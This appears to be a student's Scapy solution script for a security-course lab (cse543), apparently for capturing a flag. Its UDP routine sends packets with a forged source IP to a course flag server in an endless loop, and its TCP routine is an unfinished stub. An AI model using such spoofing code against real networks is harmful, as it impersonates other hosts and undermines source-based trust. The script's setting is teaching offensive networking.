from scapy.all import *
import argparse
import time
import socket
import netifaces as ni

def main_tcp(verbose, network_interface):
    model = {
        "src": "10.2.4.10",
        "dst": "flagit.cse543.rev.fish",
        "dport": 13337
    }
    target_ip = ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']
    dest_ip = socket.gethostbyname(model["dst"])
    # TODO: Send a TCP packet to the destination IP and port
    if verbose:
        print(f"Sending TCP packet to ({dest_ip}){model['dst']}:{model['dport']} from spoofed ip {model['src']} to {target_ip}")

def main_udp(verbose, network_interface):
    model = {
            "src": "10.2.4.10",
            "dst": "flagserv.cse543.rev.fish",
            "dport": 13337
    }
    target_ip = ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']
    dest_ip = socket.gethostbyname(model["dst"])
    if verbose:
        print(f"Sending UDP packet to ({dest_ip}){model['dst']}:{model['dport']} from spoofed ip {model['src']} to {target_ip}")
    udp = UDP(sport=0, dport=model["dport"])
    ip = IP(src=model["src"], dst=dest_ip)
    payload = target_ip
    pkt = ip/udp/payload
  
    while True:
        send(pkt)
        time.sleep(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--udp", help="Run UDP Solution", action="store_true")
    parser.add_argument("-t", "--tcp", help="Run TCP Solution", action="store_true")
    parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true")
    
    network_interface = "tap0"
    args = parser.parse_args()
    if args.udp:
        print("UDP Solution")
        main_udp(verbose=args.verbose, network_interface=network_interface)
    elif args.tcp:
        print("TCP Solution")
        main_tcp(verbose=args.verbose, network_interface=network_interface)
    else:
        print("Please select -t or -u\n")
        parser.print_help()